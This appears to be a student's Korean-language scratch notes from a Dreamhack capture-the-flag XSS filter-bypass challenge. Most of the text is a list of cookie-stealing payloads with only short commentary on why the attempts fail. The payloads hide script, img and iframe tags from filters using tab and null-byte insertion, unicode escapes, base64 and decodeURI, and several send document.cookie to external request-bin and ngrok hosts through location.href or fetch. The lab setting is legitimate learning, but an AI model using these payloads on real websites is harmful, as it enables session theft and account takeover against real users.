<script src="data:,document['locatio'+'n'].href = "/memo?memo=" + document.cookie;"></script>

<iframe srcdoc="<&#x69;mg src=1 &#x6f;nerror=alert(parent.document.domain)>">

<scr%09ipt>documen%09t['locatio'+'n'].href = "https://ltiufnz.request.dreamhack.games/?memo=" 
+ documen%09t.cookie;</scr%09iptipt>

<img src="n/a" onerror="alert(document.cookie)"/>
<img src='wrongLocation.jpg' o\tNError="lO\tcAtion.href='/memo?memo='+dOcu\tMent.cookie;" />
<iframe srcdoc='<img src=about: o&#110;error=parent.alert(document.cookie)>'></iframe>

<script> Boolean[decodeURI('%63%6F%6E%73%74%72%75%63%74%6F%72')](      
decodeURI('%61%6C%65%72%74%28%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%29'))(); 
</script>

<img srcdoc="data:text/plain;base64,PCYjeDczO2NyaXB0PmZldGNoKCcvbWVtbz9tZW1vPScrZG9jdW1lbnQuY29va2llKTwvJiN4NzM7Y3JpcHQ+"/>
<img src="data:image/png;base64;,PGltZyBzcmM9J3dyb25nTG9jYXRpb24uanBnJyBvbkVycm9yPSJsb2NhdGlvbi5ocmVmPScvbWVtbz9tZW1vPScrZG9jdW1lbnQuY29va2llOyIgLz4="/>

<s%00c%00r%00i%00p%00t>%00a%00l%00e%00r%00t%00'%001%00'</%00s%00c%00r%00i%00p%00t>
<img src="/error" o%00n%00e%00rr%00or=“lo%00ca%00tio%00n.href=’/memo?memo=’+d%00oc%00um%00ent.cookie”>
<s%00c%00r%00i%00p%00t>d%00o%00c%00u%00m%00e%00n%00t['locatio'+'n'].href = "/memo?memo=" + d%00o%00c%00u%00m%00e%00n%00t.cookie;</s%00c%00r%00i%00p%00t>
<s%00c%00r%00i%00p%00t>%00l%00o%00c%00a%00t%00i%00o%00n.href = "https://zcvhcky.request.dreamhack.games/?memo=" + d%00o%00c%00u%00m%00e%00n%00t.cookie;</s%00c%00r%00i%00p%00t>

가설 1 : <img src='wrongLocation.jpg' onError="location.href='/memo?memo='+document.cookie;" />
이 기본적인 페이로드로도 충분히 뚫린다. 따라서 중요한 건 필터링 되어 있는 부분들만 잘 우회하는 것이다
-> 가설 1이 아니라는 건 검증되었다. 필터링을 우회하는 과정에서 유효성이 떨어져서 효과가 없게 되는 건가? 
그니까 javascript로서의 문법이 지켜지질 못해서?

문제의 구성 자체는 너무 단순하다 
필터링되는 태그들이 존재하고 
그걸 우회해서 xss를 하면 성공이다 
-> 라고 생각했는데 %09 로도.. 오 그리고 
<scripont>locatioonn.href = "/memo?memo=" %2b documenont.cookie;</scripont>
<scronipt>document['locatio'+'n'].href = "/memo?memo=" + document.cookie;</scronipt>
이것만 봐도 너무 확연하게 드러난다. location.href로 경로 지정을 해주는 것도 이미 그 자체로 충분히 
유효하다고 생각했는데 사실 비슷한 우회 방식을 사용해도 위에 것은 효과가 없다. (가장 단적으로 보여준다)

가설 2 : <\u0073\u0063\u0072\u0069\u0070\u0074 src="data:,\u0064\u006f\u0063\u0075\u006d\u006e\u0065\u0074['locatio'+'n'].href = "/memo?memo=" + \u0064\u006f\u0063\u0075\u006d\u006e\u0065\u0074.cookie;"></\u0073\u0063\u0072\u0069\u0070\u0074>
사실 핵심적으로 연결되어있지만 
페이로드 자체를 바꾸어 보았다. 

<\u0073cript>\u0064ocument['locatio'+'n'].href = "/memo?memo=" + \u0064ocument.cookie;</\u0073cript>
<script>document['locatio'+'n'].href = "http://RANDOMHOST.request.dreamhack.games/?memo=" + document.cookie;</script>


<iframe srcdoc='<script src="data:text/javascript,alert(document.cookie)"></script>'></iframe>
<iframe srcdoc='<script src="/jsonp?callback=(function(){window.top.location.href=`http://f6a81b32f7f7.ngrok.io/cooookie`%2bdocument.cookie;})();//"></script>
<iframe src='data:text/html,<script defer="true" src="data:text/javascript,document.body.innerText=/hello/"></script>'></iframe>

<iframe src="data: , 
  <script>
    alert(document.cookie)
  </script>
">
</iframe>

<iframe src="javascript://youtube.com#%0afetch('https://zxxhanj.request.dreamhack.games/'+document.cookie)"></iframe>
이 페이로드가 너무 절묘하다 -> 계속 보다보면 확실히 직감이 발휘되는 것 같긴 하다 
이 페이로드 자체는 굉장히 잘 맞아떨어질 수 있는 형태를 가지고 있었으니까 

<iframe src="javascri%09pt:locatio%09n.href='https://osjauno.request.dreamhack.games/memo?memo='%2bdocumen%09t.cookie">
<iframe src="javascrip%00t:locatio%00n.href='/memo?memo='%2bdocumen%00t.cookie">
<iframe src="javascrip%0at:locatio%0an.href='/memo?memo='%2bdocumen%0at.cookie">

<iframe src="javascri%09pt:#fetch''https://csighyf.request.dreamhack.games/memo?memo='%2bdocumen%09t.cookie'"></iframe>
<iframe src="javascri%09pt:fetch''https://csighyf.request.dreamhack.games/memo?memo='%2bdocumen%09t.cookie'"></iframe>
<iframe src="javascrip t:locatio n.href='/memo?memo='+documen t.cookie">

필터링 단어들을 공백으로 치환하지 않고 filtered란 단어를 출력하게 하였다.

Exploit Tech: XSS Filtering Bypass - I에서 보면 URI 정규화 관련 내용이 나온다.

정규화 과정을 이용해서 접근해보았다. %09(\t), %0a(\n)을 이용하면 된다. : <iframe src="javascri%09pt:alert`1`"> --> alert(1) 실행된다. 흠... 
<iframe src="javascri%09pt:alert`1`">
이걸로 xss가 된다는 거 자체가 
1)iframe src로 넣어서 javascript를 실행할 수 있다는 의미 
2)%09를 넣어서 javascript 필터링을 우회할 수 있다는 의미 -> location이랑 document에도 유효하다 ..
3) ' ' 를 넣어서 ( ) 괄호 필터링을 우회할 수 있다는 의미  

테스트 쿠키를 만든 뒤 /vuln 페이지에서 아래의 페이로드를 보내면 쿠키 값이 메모장에 출력된다. : <iframe src="javascri%09pt:locatio%09n.href='/memo?memo='%2bdocumen%09t.cookie">

flag 페이지에서 입력할 때 아래 payload 그대로 넣어야 동작한다. (/vuln 페이지에 페이로드를 넣고 소스페이지에서 확인)

payload : <iframe src="javascrip t:locatio n.href='/memo?memo='+documen t.cookie"> 
(걔가 한 말은 이해가 되었다. 걔가 했던 말은 /vuln 페이지에 페이로드를 넣으면 
url encoding 되는 걸 실시간으로 볼 수 있으니까 위에 나온 최종 페이로드처럼 
저렇게 나올 수 있는 우회할 값을 정확히 넣을 때 원하는 플래그를 얻을 수 있다는 뜻이었다) 
->%20은 전형적인 띄어쓰기인데 이걸로는 상관이 없었다 -- flag가 나오지 않았다 
<iframe src="javascri%09pt:locatio%09n.href='/memo?memo='%2bdocumen%09t.cookie">
<iframe src="javascri%0apt:locatio%0an.href='/memo?memo='%2bdocumen%0at.cookie">
<iframe src="javascri%09pt:locatio%09n.href='/memo?memo='%2bdocumen%20t.cookie">
<iframe src="javascri%0dpt:locatio%0dn.href='/memo?memo='%2bdocumen%0dt.cookie">
-- 여기 있는 부분은 위에 나온 최종 페이로드와 정확히 일치하게 나오질 않는다 
<iframe src="javascrip+t:locatio+n.href='/memo?memo='%2bdocumen+t.cookie">
<iframe src="javascrip+t:locatio/**/n.href='/memo?memo='%2bdocumen/**/t.cookie">
<iframe src="javascri%09pt:locatio%09n.href='/memo?memo='%2bdocumen%09t.cookie">
<img src='wro%09ngLocatio%09n.jpg' o%09nError="locatio%09n.href='/memo?memo='+docume%09nt.cookie;" />
<iframe src="javascri%09pt:locatio%09n.href='/memo?memo='%2bdocumen%09t.cookie">
가설 1이 아니었네.. 똑같은 걸 해서 결국엔 우회만 하면 될 줄 알았는데 그게 아니었음 

<iframe src="javascri%09pt:alert'documen%09t.domain'"></iframe>

<iframe srcdoc="<scr%09ipt>alert'docume%09nt.domain'</scr%09ipt>"></iframe>

<script>location.href="/memo?memo="+document.cookie;</script> 
<iframe srcdoc="<scr%09ipt>locatio%09n.href="/memo?memo="+docume%09nt.cookie;</scr%09ipt>"></iframe>

<iframe src="data:text/html;,<script>alert(document.domain)</script>"></iframe>
그러므로 iframe은 굳이 data scheme(data:)를 사용해도 이득이 없네요. 
iframe은 <iframe srcdoc="<script>alert(document.domain)</script>"></iframe>처럼 <iframe srcdoc="HTML CODE">
를 사용해야지 부모창의 쿠키에 접근할 수 있습니다.
>>iframe은 data scheme을 사용하는 게 아니라 html code를 써야 한다... 

<iframe src="javascri%09pt:fetch''https://rrvcigy.request.dreamhack.games/memo?memo='+documen%09t.domain'"></iframe>
-> 그냥 단순 따옴표 문제는 아니겠지... 설마... 설마... 설마..... 
<iframe src="javascri%09pt:alert'documen%09t.domain'"></iframe>

<iframe srcdoc="<scrip%09t>fetch('/memo?memo='%2bdocumen%09t.cookie)</scrip%09t>">
<iframe srcdoc="<&#x73;cript>fetch('/memo?memo='+document.cookie)</&#x73;cript>">
그냥 bypass로 실험하면서 알게 된건데.. 페이로드 자체에 문제가 있는 듯하다. 
근데 문제점이라는 게 과연 뭔지 모르겠다... 
일단 일반론적인 차원으로 정리하면 <script> 태그의 경우 %09를 넣는다고 우회가 되진 않는다 
뜻이 없는 것처럼 처리된다. 
javascript의 경우 완벽히 정확하게 값을 넣어야 처리되기 때문인 건가 
그니까 조금 더 추상적인 차원으로 정리해보면, 내가 여기서 시도한 부분은 
기본적인 조건이 충족된 상태에서(location.href, script, iframe 등) + 필터링을 우회하는 것이었다
그래서 필터링 우회에 내가 아는 선에서 가장 유효했던 %09를 이용했지만 
나머지 조건을 완벽히 충족시켜주어도 payload가 유효하지 않다는 결론만 얻게 되었다.  
<iframe src="javascri%09pt:locatio%09n.href='/memo?memo='+documen%09t.cookie">

<iframe srcdoc="<img src='wroonngLocatioonn.jpg' oonnError="locatio%09n.href='/memo?memo='+document.cookie;" />">
<img src='wro%09ngLocatio%09n.jpg' o%09nError="locatio%09n.href='/memo?memo='+docume%09nt.cookie;" />
<scrip%09t>locatio%09n.href = "/memo?memo=" + documen%09t.cookie;</scrip%09t>
<scripont>locatioonn.href = "/memo?memo=" %2b documenont.cookie;</scripont>
<scronipt>document['locatio'+'n'].href = "/memo?memo=" + document.cookie;</scronipt>
<scrip%09t>document['locatio'+'n'].href = "/memo?memo=" + document.cookie;</scrip%09t>

<img src=@ onerror=location.href="https://jytoplk.request.dreamhack.games/".concat(document.cookie)>
<iframe srcdoc="<img src=@ o%09nerror=documen%09t['locatio'+'n'].href="/memo?memo=".co%09ncat'documen%09t.cookie'>"></iframe>
<iframe%20src="javascrip%09t:locatio%09n.href=%27/memo?memo=%27+documen%09t.cookie">
<iframe src="javascri%09pt:locatio%09n.href='https://hvpsjdk.request.dreamhack.games/memo?memo='+documen%09t.cookie">
<iframe src="javascri%09pt:locatio%09n.href='/memo?memo='+documen%09t.cookie">
페이로드가 적절한데도 불구하고 아무런 값이 나오질 않는다. 정말로 다른 점을 1도 모르겠다.. 
<iframe%20src="javascrip%09t:locatio%09n.href=%27/memo?memo=%27%2bdocumen%09t.cookie">
<iframe src="javascrip%09t:locatio%09n.href=%27https://vvnhexw.request.dreamhack.games/memo?memo=%27%2bdocumen%09t.cookie">
<iframe src="javascrip	t:locatio	n.href='/memo?memo='+documen	t.cookie">
일단 한 발짝 물러서는 게 맞다고 판단했다 
일단 경로 문제는 아니다.. 그리고 필터링을 통과하는 것도 확인했으니 필터링 문제도 아니다 경로나 필터링은 둘 다 괜찮다 
flag=DH{---secret---}    raw 데이터 형식 그대로 였음 
